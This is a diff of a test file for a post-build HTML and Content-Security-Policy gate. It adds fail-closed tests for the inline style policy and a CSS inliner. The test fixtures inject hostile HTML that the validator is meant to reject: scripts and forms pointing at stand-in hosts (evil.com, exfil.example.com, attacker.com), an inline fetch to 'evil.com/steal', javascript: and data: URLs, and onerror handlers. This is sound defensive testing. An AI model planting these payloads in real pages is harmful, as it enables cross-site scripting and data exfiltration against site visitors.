@@ -1,20 +1,24 @@
 /**
- * Unit tests for the Post-Build HTML and CSP Compatibility Gate (Issue #223).
+ * Unit and regression tests for the Post-Build HTML and CSP Compatibility Gate (Issue #223).
  *
- * Verifies that the post-build gate:
- * • Validates final built HTML and static assets in dist/ rather than source templates.
- * • Rejects unapproved script, style, font, image, srcset, form, base, and frame origins.
- * • Rejects `javascript:`, `vbscript:`, and executable `data:` URLs (including whitespace-obfuscated forms).
- * • Rejects inline `on*` event attributes and `srcdoc` frames.
- * • Rejects insecure `http://` mixed content across HTML attributes, srcset, and CSS `url()` / `@import`.
- * • Enforces required security/document metadata (`<!doctype html>`, `<html lang>`, `<meta charset="UTF-8">`, viewport, `<title>`).
- * • Rejects duplicate metadata tags and rogue `<meta http-equiv="Content-Security-Policy">` or `refresh` tags.
- * • Enforces exact SHA-256 hashes for inline `<script>` blocks (no substring bypass) and narrow generated inline `<style>` policy.
- * • Validates Subresource Integrity (`integrity` + `crossorigin`) and JSON-LD structured data.
+ * Verifies that the post-build gate and CSS inliner:
+ * • Validate final built HTML and static assets in dist/ rather than source templates.
+ * • Fail closed on missing, malformed, empty, or invalid inline style policy data.
+ * • Reject unapproved inline <style> blocks without any Tailwind marker heuristic fallback.
+ * • Fail fatally in `inline-css.js` when no CSS asset exists or the stylesheet link tag is missing.
+ * • Reject unapproved script, style, font, image, srcset, form, base, and frame origins.
+ * • Reject `javascript:`, `vbscript:`, and executable `data:` URLs (including whitespace-obfuscated forms).
+ * • Reject inline `on*` event attributes and `srcdoc` frames.
+ * • Reject insecure `http://` mixed content across HTML attributes, srcset, and CSS `url()` / `@import`.
+ * • Enforce required security/document metadata (`<!doctype html>`, `<html lang>`, `<meta charset="UTF-8">`, viewport, `<title>`).
+ * • Reject duplicate metadata tags and rogue `<meta http-equiv="Content-Security-Policy">` or `refresh` tags.
+ * • Enforce exact SHA-256 hashes for inline `<script>` blocks and narrow generated inline `<style>` policy.
+ * • Validate Subresource Integrity (`integrity` + `crossorigin`) and JSON-LD structured data.
  */
 
 import { describe, expect, it } from 'vitest';
-import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync, existsSync } from 'node:fs';
+import { spawnSync } from 'node:child_process';
+import { existsSync, mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { dirname, join } from 'node:path';
 import { fileURLToPath } from 'node:url';
@@ -27,19 +31,27 @@ import {
   isUrlAllowedUnderDirective,
   findHtmlFiles,
   loadGeneratedInlineStyleHashes,
+  runPostBuildGate,
 } from '../scripts/check-html-csp.ts';
+import { inlineCss } from '../scripts/inline-css.js';
 import {
   APPROVED_INLINE_SCRIPT_HASHES,
   PAGE_CSP_DIRECTIVES,
 } from '../src/utils/security-headers.ts';
 
 const __dirname = dirname(fileURLToPath(import.meta.url));
+const repoRoot = join(__dirname, '..');
 
 const SAMPLE_INLINE_CSS = `/*! tailwindcss v4.2.2 | MIT License */
 :root { --color-surface: #0e0e0e; }
 @layer base { body { margin: 0; } }`;
 
 const SAMPLE_STYLE_HASH = computeSha256(SAMPLE_INLINE_CSS);
+
+const VALID_OPTIONS = {
+  approvedScriptHashes: new Set<string>(APPROVED_INLINE_SCRIPT_HASHES),
+  approvedStyleHashes: new Set<string>([SAMPLE_STYLE_HASH]),
+};
 
 const VALID_SAMPLE_HTML = `<!doctype html>
 <html lang="en">
@@ -106,34 +118,218 @@ const VALID_SAMPLE_HTML = `<!doctype html>
 describe('Post-Build HTML and CSP Compatibility Gate', () => {
   describe('Final build output & compliant HTML acceptance', () => {
     it('accepts compliant HTML matching exact script and generated style SHA-256 hashes', () => {
-      const result = validateHtml(VALID_SAMPLE_HTML, 'index.html', {
-        approvedScriptHashes: new Set(APPROVED_INLINE_SCRIPT_HASHES),
-        approvedStyleHashes: new Set([SAMPLE_STYLE_HASH]),
-      });
+      const result = validateHtml(VALID_SAMPLE_HTML, 'index.html', VALID_OPTIONS);
       expect(result.ok, JSON.stringify(result.violations)).toBe(true);
       expect(result.violations).toHaveLength(0);
       expect(result.inlineScriptHashes).toEqual([...APPROVED_INLINE_SCRIPT_HASHES]);
       expect(result.inlineStyleHashes).toEqual([SAMPLE_STYLE_HASH]);
     });
 
-    it('validates every built HTML file and static asset in dist/ when present', () => {
-      const distDir = join(__dirname, '../dist');
+    it('validates every built HTML file and static asset in dist/ fail-closed when present', () => {
+      const distDir = join(repoRoot, 'dist');
       if (existsSync(distDir)) {
         const htmlFiles = findHtmlFiles(distDir);
         expect(htmlFiles.length).toBeGreaterThan(0);
 
         const generatedStyleHashes = loadGeneratedInlineStyleHashes();
-        for (const file of htmlFiles) {
-          const html = readFileSync(file, 'utf8');
-          const result = validateHtml(html, file, {
-            approvedScriptHashes: new Set(APPROVED_INLINE_SCRIPT_HASHES),
-            approvedStyleHashes: generatedStyleHashes.size > 0 ? generatedStyleHashes : undefined,
-          });
-          expect(result.ok, `${file}: ${JSON.stringify(result.violations)}`).toBe(true);
-        }
+        expect(generatedStyleHashes.size).toBeGreaterThan(0);
 
-        const assetViolations = validateBuiltAssets(distDir);
-        expect(assetViolations).toEqual([]);
+        const gateResult = runPostBuildGate({ distDir });
+        expect(gateResult.ok, JSON.stringify(gateResult.violations)).toBe(true);
+        expect(gateResult.violations).toEqual([]);
+        expect(gateResult.assetViolations).toEqual([]);
+      }
+    });
+  });
+
+  describe('Fail-closed inline style policy & CSS inliner enforcement', () => {
+    it('rejects Tailwind-like inline styles when no approvedStyleHashes are supplied (no heuristic fallback)', () => {
+      const omittedResult = validateHtml(VALID_SAMPLE_HTML, 'index.html');
+      expect(omittedResult.ok).toBe(false);
+      expect(omittedResult.violations.some((v) => v.type === 'unapproved-inline-style')).toBe(true);
+
+      const emptySetResult = validateHtml(VALID_SAMPLE_HTML, 'index.html', {
+        approvedScriptHashes: VALID_OPTIONS.approvedScriptHashes,
+        approvedStyleHashes: new Set<string>(),
+      });
+      expect(emptySetResult.ok).toBe(false);
+      expect(emptySetResult.violations.some((v) => v.type === 'unapproved-inline-style')).toBe(
+        true,
+      );
+    });
+
+    it('fails fatally when generated inline style policy file is missing (unit + production CLI)', () => {
+      const tmp = mkdtempSync(join(tmpdir(), 'wraith-csp-missing-policy-'));
+      try {
+        const distDir = join(tmp, 'dist');
+        mkdirSync(distDir, { recursive: true });
+        writeFileSync(join(distDir, 'index.html'), VALID_SAMPLE_HTML, 'utf8');
+        const missingPolicyPath = join(tmp, 'missing-policy.json');
+
+        expect(() => loadGeneratedInlineStyleHashes(missingPolicyPath)).toThrow(/Missing/i);
+        expect(() => runPostBuildGate({ distDir, inlinePolicyPath: missingPolicyPath })).toThrow(
+          /Missing/i,
+        );
+
+        const cli = spawnSync(
+          process.execPath,
+          [
+            '--import',
+            'tsx',
+            join(repoRoot, 'scripts', 'check-html-csp.ts'),
+            '--dist',
+            distDir,
+            '--policy',
+            missingPolicyPath,
+          ],
+          { cwd: repoRoot, encoding: 'utf8' },
+        );
+        expect(cli.status).toBe(1);
+        expect(cli.stderr).toMatch(/Missing generated inline style policy file/);
+      } finally {
+        rmSync(tmp, { recursive: true, force: true });
+      }
+    });
+
+    it('fails fatally when generated inline style policy data is malformed, empty, or contains invalid entries', () => {
+      const tmp = mkdtempSync(join(tmpdir(), 'wraith-csp-invalid-policy-'));
+      try {
+        const distDir = join(tmp, 'dist');
+        mkdirSync(distDir, { recursive: true });
+        writeFileSync(join(distDir, 'index.html'), VALID_SAMPLE_HTML, 'utf8');
+
+        const cases = [
+          { name: 'malformed JSON', content: '{not-valid-json' },
+          {
+            name: 'empty array',
+            content: JSON.stringify({ sourceAsset: 'assets/a.css', inlineStyleHashes: [] }),
+          },
+          {
+            name: 'missing sourceAsset',
+            content: JSON.stringify({ inlineStyleHashes: [SAMPLE_STYLE_HASH] }),
+          },
+          {
+            name: 'non-array inlineStyleHashes',
+            content: JSON.stringify({
+              sourceAsset: 'assets/a.css',
+              inlineStyleHashes: SAMPLE_STYLE_HASH,
+            }),
+          },
+          {
+            name: 'mixed valid and invalid hash entries',
+            content: JSON.stringify({
+              sourceAsset: 'assets/a.css',
+              inlineStyleHashes: [SAMPLE_STYLE_HASH, 'not-a-hash'],
+            }),
+          },
+        ];
+
+        for (const testCase of cases) {
+          const policyPath = join(tmp, `${testCase.name.replace(/\s+/g, '-')}.json`);
+          writeFileSync(policyPath, testCase.content, 'utf8');
+
+          expect(() => loadGeneratedInlineStyleHashes(policyPath), testCase.name).toThrow();
+          expect(
+            () => runPostBuildGate({ distDir, inlinePolicyPath: policyPath }),
+            testCase.name,
+          ).toThrow();
+        }
+      } finally {
+        rmSync(tmp, { recursive: true, force: true });
+      }
+    });
+
+    it('fails fatally in inlineCss and CLI when stylesheet link tag is missing and clears stale policy', () => {
+      const tmp = mkdtempSync(join(tmpdir(), 'wraith-inline-css-missing-link-'));
+      try {
+        const distDir = join(tmp, 'dist');
+        const assetsDir = join(distDir, 'assets');
+        mkdirSync(assetsDir, { recursive: true });
+        writeFileSync(
+          join(distDir, 'index.html'),
+          '<!doctype html><html><head></head></html>',
+          'utf8',
+        );
+        writeFileSync(join(assetsDir, 'index-test123.css'), SAMPLE_INLINE_CSS, 'utf8');
+
+        const policyPath = join(tmp, 'csp-inline-policy.json');
+        writeFileSync(
+          policyPath,
+          JSON.stringify({
+            sourceAsset: 'assets/stale.css',
+            inlineStyleHashes: [SAMPLE_STYLE_HASH],
+          }),
+          'utf8',
+        );
+
+        expect(() => inlineCss({ distDir, inlinePolicyPath: policyPath })).toThrow(
+          /could not find stylesheet <link> tag/,
+        );
+        expect(existsSync(policyPath)).toBe(false);
+
+        const cli = spawnSync(
+          process.execPath,
+          [join(repoRoot, 'scripts', 'inline-css.js'), '--dist', distDir, '--policy', policyPath],
+          { cwd: repoRoot, encoding: 'utf8' },
+        );
+        expect(cli.status).toBe(1);
+        expect(cli.stderr).toMatch(/could not find stylesheet <link> tag/);
+      } finally {
+        rmSync(tmp, { recursive: true, force: true });
+      }
+    });
+
+    it('fails fatally in inlineCss when no CSS asset exists in dist/assets', () => {
+      const tmp = mkdtempSync(join(tmpdir(), 'wraith-inline-css-no-asset-'));
+      try {
+        const distDir = join(tmp, 'dist');
+        mkdirSync(join(distDir, 'assets'), { recursive: true });
+        writeFileSync(
+          join(distDir, 'index.html'),
+          '<!doctype html><html><head></head></html>',
+          'utf8',
+        );
+        const policyPath = join(tmp, 'csp-inline-policy.json');
+
+        expect(() => inlineCss({ distDir, inlinePolicyPath: policyPath })).toThrow(
+          /No CSS asset found to inline/,
+        );
+      } finally {
+        rmSync(tmp, { recursive: true, force: true });
+      }
+    });
+
+    it('inlines CSS end-to-end, writes strict policy, deletes CSS asset, and passes runPostBuildGate', () => {
+      const tmp = mkdtempSync(join(tmpdir(), 'wraith-inline-css-e2e-'));
+      try {
+        const distDir = join(tmp, 'dist');
+        const assetsDir = join(distDir, 'assets');
+        mkdirSync(assetsDir, { recursive: true });
+
+        const htmlWithStylesheetLink = VALID_SAMPLE_HTML.replace(
+          `<style>${SAMPLE_INLINE_CSS}</style>`,
+          '<link rel="stylesheet" crossorigin href="/assets/index-test123.css" />',
+        );
+        writeFileSync(join(distDir, 'index.html'), htmlWithStylesheetLink, 'utf8');
+        writeFileSync(join(assetsDir, 'index-test123.css'), SAMPLE_INLINE_CSS, 'utf8');
+
+        const policyPath = join(tmp, 'csp-inline-policy.json');
+        const inlineResult = inlineCss({ distDir, inlinePolicyPath: policyPath });
+
+        expect(inlineResult.sourceAsset).toBe('assets/index-test123.css');
+        expect(inlineResult.inlineStyleHashes).toEqual([SAMPLE_STYLE_HASH]);
+        expect(existsSync(join(assetsDir, 'index-test123.css'))).toBe(false);
+        expect(existsSync(policyPath)).toBe(true);
+
+        const gateResult = runPostBuildGate({ distDir, inlinePolicyPath: policyPath });
+        expect(gateResult.ok, JSON.stringify(gateResult.violations)).toBe(true);
+        expect(gateResult.htmlFilesCount).toBe(1);
+        expect(gateResult.uniqueStyleHashes).toEqual([SAMPLE_STYLE_HASH]);
+        expect(readFileSync(join(distDir, 'index.html'), 'utf8')).toContain(
+          `<style>${SAMPLE_INLINE_CSS}</style>`,
+        );
+      } finally {
+        rmSync(tmp, { recursive: true, force: true });
       }
     });
   });
@@ -144,7 +340,7 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
         '</head>',
         '<script src="https://evil.com/tracker.js"></script></head>',
       );
-      const result = validateHtml(html);
+      const result = validateHtml(html, 'index.html', VALID_OPTIONS);
       expect(result.ok).toBe(false);
       expect(result.violations.some((v) => v.type === 'unapproved-origin')).toBe(true);
       expect(result.violations.some((v) => v.message.includes('evil.com'))).toBe(true);
@@ -155,7 +351,7 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
         '</head>',
         '<link rel="stylesheet" href="https://untrusted-cdn.com/styles.css" /></head>',
       );
-      const result = validateHtml(html);
+      const result = validateHtml(html, 'index.html', VALID_OPTIONS);
       expect(result.ok).toBe(false);
       expect(result.violations.some((v) => v.type === 'unapproved-origin')).toBe(true);
     });
@@ -165,7 +361,7 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
         '</head>',
         '<link rel="preload" href="https://untrusted-fonts.com/font.woff2" as="font" /></head>',
       );
-      const result = validateHtml(html);
+      const result = validateHtml(html, 'index.html', VALID_OPTIONS);
       expect(result.ok).toBe(false);
       expect(result.violations.some((v) => v.type === 'unapproved-origin')).toBe(true);
     });
@@ -175,13 +371,13 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
         '</body>',
         '<img src="https://unauthorized-cdn.com/banner.png" /></body>',
       );
-      expect(validateHtml(htmlSrc).ok).toBe(false);
+      expect(validateHtml(htmlSrc, 'index.html', VALID_OPTIONS).ok).toBe(false);
 
       const htmlSrcset = VALID_SAMPLE_HTML.replace(
         '</body>',
         '<img src="/logo.png" srcset="https://unauthorized-cdn.com/2x.png 2x" /></body>',
       );
-      const resSrcset = validateHtml(htmlSrcset);
+      const resSrcset = validateHtml(htmlSrcset, 'index.html', VALID_OPTIONS);
       expect(resSrcset.ok).toBe(false);
       expect(resSrcset.violations.some((v) => v.type === 'unapproved-origin')).toBe(true);
     });
@@ -193,6 +389,8 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
             '</body>',
             '<iframe src="https://phishing.com"></iframe></body>',
           ),
+          'index.html',
+          VALID_OPTIONS,
         ).ok,
       ).toBe(false);
     });
@@ -204,12 +402,16 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
             '</body>',
             '<form action="https://exfil.example.com/collect"></form></body>',
           ),
+          'index.html',
+          VALID_OPTIONS,
         ).ok,
       ).toBe(false);
 
       expect(
         validateHtml(
           VALID_SAMPLE_HTML.replace('</head>', '<base href="https://attacker.com/" /></head>'),
+          'index.html',
+          VALID_OPTIONS,
         ).ok,
       ).toBe(false);
     });
@@ -217,6 +419,8 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
     it('rejects disallowed object and embed elements under object-src none', () => {
       const objRes = validateHtml(
         VALID_SAMPLE_HTML.replace('</body>', '<object data="/app.swf"></object></body>'),
+        'index.html',
+        VALID_OPTIONS,
       );
       expect(objRes.ok).toBe(false);
       expect(objRes.violations.some((v) => v.type === 'disallowed-element')).toBe(true);
@@ -249,7 +453,7 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
         '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
       ]) {
         const html = VALID_SAMPLE_HTML.replace('</body>', `${payload}</body>`);
-        const result = validateHtml(html);
+        const result = validateHtml(html, 'index.html', VALID_OPTIONS);
         expect(result.ok).toBe(false);
         expect(result.violations.some((v) => v.type === 'javascript-url')).toBe(true);
       }
@@ -260,23 +464,31 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
         '</body>',
         '<img src="http://usewraith.xyz/logo.png" /></body>',
       );
-      expect(validateHtml(htmlImg).violations.some((v) => v.type === 'mixed-content')).toBe(true);
+      expect(
+        validateHtml(htmlImg, 'index.html', VALID_OPTIONS).violations.some(
+          (v) => v.type === 'mixed-content',
+        ),
+      ).toBe(true);
 
       const htmlSrcset = VALID_SAMPLE_HTML.replace(
         '</body>',
         '<img src="/logo.png" srcset="http://usewraith.xyz/logo@2x.png 2x" /></body>',
       );
-      expect(validateHtml(htmlSrcset).violations.some((v) => v.type === 'mixed-content')).toBe(
-        true,
-      );
+      expect(
+        validateHtml(htmlSrcset, 'index.html', VALID_OPTIONS).violations.some(
+          (v) => v.type === 'mixed-content',
+        ),
+      ).toBe(true);
 
       const htmlInlineStyle = VALID_SAMPLE_HTML.replace(
         '</body>',
         '<div style="background: url(http://usewraith.xyz/bg.png)"></div></body>',
       );
-      expect(validateHtml(htmlInlineStyle).violations.some((v) => v.type === 'mixed-content')).toBe(
-        true,
-      );
+      expect(
+        validateHtml(htmlInlineStyle, 'index.html', VALID_OPTIONS).violations.some(
+          (v) => v.type === 'mixed-content',
+        ),
+      ).toBe(true);
     });
   });
 
@@ -285,6 +497,8 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
       expect(
         validateHtml(
           VALID_SAMPLE_HTML.replace('</body>', '<button onclick="doAction()">Run</button></body>'),
+          'index.html',
+          VALID_OPTIONS,
         ).violations.some((v) => v.type === 'inline-event-handler'),
       ).toBe(true);
     });
@@ -293,15 +507,19 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
       expect(
         validateHtml(
           VALID_SAMPLE_HTML.replace('</body>', '<img src="/a.png" onerror="alert(1)" /></body>'),
+          'index.html',
+          VALID_OPTIONS,
         ).violations.some((v) => v.type === 'inline-event-handler'),
       ).toBe(true);
     });
 
     it('rejects onload attribute on body and inline srcdoc on iframe', () => {
       expect(
-        validateHtml(VALID_SAMPLE_HTML.replace('<body>', '<body onload="init()">')).violations.some(
-          (v) => v.type === 'inline-event-handler',
-        ),
+        validateHtml(
+          VALID_SAMPLE_HTML.replace('<body>', '<body onload="init()">'),
+          'index.html',
+          VALID_OPTIONS,
+        ).violations.some((v) => v.type === 'inline-event-handler'),
       ).toBe(true);
 
       expect(
@@ -310,6 +528,8 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
             '</body>',
             '<iframe srcdoc="<script>alert(1)</script>"></iframe></body>',
           ),
+          'index.html',
+          VALID_OPTIONS,
         ).violations.some((v) => v.type === 'unapproved-inline-script'),
       ).toBe(true);
     });
@@ -318,9 +538,11 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
   describe('Critical security metadata, duplicate detection, and HTML/SRI integrity', () => {
     it('rejects missing <meta charset="UTF-8">', () => {
       expect(
-        validateHtml(VALID_SAMPLE_HTML.replace('<meta charset="UTF-8" />', '')).violations.some(
-          (v) => v.type === 'missing-metadata' && v.message.includes('charset'),
-        ),
+        validateHtml(
+          VALID_SAMPLE_HTML.replace('<meta charset="UTF-8" />', ''),
+          'index.html',
+          VALID_OPTIONS,
+        ).violations.some((v) => v.type === 'missing-metadata' && v.message.includes('charset')),
       ).toBe(true);
     });
 
@@ -328,6 +550,8 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
       expect(
         validateHtml(
           VALID_SAMPLE_HTML.replace('charset="UTF-8"', 'charset="ISO-8859-1"'),
+          'index.html',
+          VALID_OPTIONS,
         ).violations.some((v) => v.type === 'missing-metadata' && v.message.includes('UTF-8')),
       ).toBe(true);
     });
@@ -339,19 +563,25 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
             '<meta name="viewport" content="width=device-width, initial-scale=1.0" />',
             '',
           ),
+          'index.html',
+          VALID_OPTIONS,
         ).violations.some((v) => v.type === 'missing-metadata' && v.message.includes('viewport')),
       ).toBe(true);
 
       expect(
-        validateHtml(VALID_SAMPLE_HTML.replace('<html lang="en">', '<html>')).violations.some(
-          (v) => v.type === 'missing-metadata' && v.message.includes('lang'),
-        ),
+        validateHtml(
+          VALID_SAMPLE_HTML.replace('<html lang="en">', '<html>'),
+          'index.html',
+          VALID_OPTIONS,
+        ).violations.some((v) => v.type === 'missing-metadata' && v.message.includes('lang')),
       ).toBe(true);
 
       expect(
-        validateHtml(VALID_SAMPLE_HTML.replace('<!doctype html>', '')).violations.some(
-          (v) => v.type === 'malformed-html',
-        ),
+        validateHtml(
+          VALID_SAMPLE_HTML.replace('<!doctype html>', ''),
+          'index.html',
+          VALID_OPTIONS,
+        ).violations.some((v) => v.type === 'malformed-html'),
       ).toBe(true);
     });
 
@@ -362,6 +592,8 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
             '<title>Wraith Protocol</title>',
             '<title>Wraith Protocol</title><title>Second</title>',
           ),
+          'index.html',
+          VALID_OPTIONS,
         ).violations.some((v) => v.type === 'duplicate-metadata'),
       ).toBe(true);
     });
@@ -373,6 +605,8 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
             '</head>',
             '<meta name="description" content="Second" /></head>',
           ),
+          'index.html',
+          VALID_OPTIONS,
         ).violations.some((v) => v.type === 'duplicate-metadata'),
       ).toBe(true);
     });
@@ -384,6 +618,8 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
             '</head>',
             '<link rel="canonical" href="https://usewraith.xyz" /><link rel="canonical" href="https://usewraith.xyz/about" /></head>',
           ),
+          'index.html',
+          VALID_OPTIONS,
         ).violations.some((v) => v.type === 'duplicate-metadata'),
       ).toBe(true);
     });
@@ -395,6 +631,8 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
             '</head>',
             '<meta http-equiv="Content-Security-Policy" content="default-src *" /></head>',
           ),
+          'index.html',
+          VALID_OPTIONS,
         ).violations.some((v) => v.type === 'integrity-violation'),
       ).toBe(true);
 
@@ -404,6 +642,8 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
             '</head>',
             '<meta http-equiv="refresh" content="0;url=https://evil.com" /></head>',
           ),
+          'index.html',
+          VALID_OPTIONS,
         ).violations.some((v) => v.type === 'disallowed-element'),
       ).toBe(true);
     });
@@ -415,6 +655,8 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
             '</head>',
             '<script src="https://plausible.io/js/script.js" integrity="md5-weak"></script></head>',
           ),
+          'index.html',
+          VALID_OPTIONS,
         ).violations.some((v) => v.type === 'integrity-violation'),
       ).toBe(true);
 
@@ -424,6 +666,8 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
             '</head>',
             `<script src="https://plausible.io/js/script.js" integrity="${SAMPLE_STYLE_HASH}"></script></head>`,
           ),
+          'index.html',
+          VALID_OPTIONS,
         ).violations.some(
           (v) => v.type === 'integrity-violation' && v.message.includes('crossorigin'),
         ),
@@ -438,7 +682,7 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
         fetch('https://evil.com/steal');
       </script>`;
       const html = VALID_SAMPLE_HTML.replace('</body>', `${spoofedScript}</body>`);
-      const result = validateHtml(html);
+      const result = validateHtml(html, 'index.html', VALID_OPTIONS);
       expect(result.ok).toBe(false);
       expect(result.violations.some((v) => v.type === 'unapproved-inline-script')).toBe(true);
     });
@@ -456,7 +700,7 @@ describe('Post-Build HTML and CSP Compatibility Gate', () => {
         '<script type="application/ld+json">',
         '<script type="application/ld+json">{ broken json </script><script type="application/ld+json">',
       );
-      const result = validateHtml(html);
+      const result = validateHtml(html, 'index.html', VALID_OPTIONS);
       expect(result.ok).toBe(false);
       expect(
         result.violations.some(
